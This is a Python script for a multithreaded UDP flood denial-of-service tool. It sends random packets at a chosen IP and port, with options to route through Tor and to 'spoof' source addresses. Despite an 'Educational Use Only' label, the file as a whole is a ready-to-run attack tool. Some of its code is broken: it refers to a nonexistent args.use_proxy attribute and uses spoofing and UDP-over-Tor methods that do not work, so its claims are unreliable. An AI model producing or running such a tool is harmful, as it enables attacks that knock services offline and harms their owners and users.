import socket
import random
import time
import sys
import threading
from argparse import ArgumentParser

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration, threads=5, packet_size=1024, use_proxy=False, spoof_ip=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.packet_size = packet_size
        self.use_proxy = use_proxy
        self.spoof_ip = spoof_ip
        self.packets_sent = 0
        self.running = True

    def send_udp(self):
        try:
            if self.use_proxy:
                import socks
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)  # TOR proxy example
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            payload = random._urandom(self.packet_size)
            
            while self.running:
                if self.spoof_ip:
                    # Fake IP randomization (Linux only, requires root)
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    sock.bind((fake_ip, 0))  # Bind to fake source IP
                
                sock.sendto(payload, (self.target_ip, self.target_port))
                self.packets_sent += 1

        except Exception as e:
            print(f"[ERROR] Thread failed: {e}")

    def start(self):
        print(f"🚀 Starting UDP flood on {self.target_ip}:{self.target_port}")
        print(f"⏱ Duration: {self.duration}s | Threads: {self.threads} | Packet size: {self.packet_size} bytes")
        print(f"🔌 Proxy: {'ON (TOR)' if self.use_proxy else 'OFF'} | IP Spoofing: {'ON' if self.spoof_ip else 'OFF'}")

        # Start threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send_udp)
            t.daemon = True
            t.start()
            threads.append(t)

        # Run for the specified duration
        start_time = time.time()
        while time.time() - start_time < self.duration:
            time.sleep(0.1)
            sys.stdout.write(f"\r📦 Packets sent: {self.packets_sent} | ⚡ Speed: {self.packets_sent / (time.time() - start_time + 0.1):.2f} pkt/s")
            sys.stdout.flush()

        self.running = False
        for t in threads:
            t.join()

        total_data = (self.packets_sent * self.packet_size) / (1024 ** 2)  # MB
        print(f"\n🔥 Attack finished!")
        print(f"📊 Total packets: {self.packets_sent}")
        print(f"💾 Data sent: {total_data:.2f} MB")
        print(f"⚡ Average speed: {self.packets_sent / self.duration:.2f} pkt/s")

if __name__ == "__main__":
    parser = ArgumentParser(description="UDP Flood Testing Tool (Educational Use Only)")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target UDP port")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Attack duration in seconds")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-s", "--packet_size", type=int, default=1024, help="Packet size in bytes")
    parser.add_argument("-p", "--proxy", action="store_true", help="Use SOCKS5 proxy (e.g., TOR)")
    parser.add_argument("-S", "--spoof", action="store_true", help="Spoof source IP (Linux only, requires root)")
    
    args = parser.parse_args()

    if args.spoof and not args.use_proxy:
        print("[WARNING] IP spoofing requires raw socket access (Linux + root).")

    flooder = UDPFlooder(
        args.target_ip,
        args.target_port,
        args.duration,
        args.threads,
        args.packet_size,
        args.proxy,
        args.spoof
    )
    flooder.start()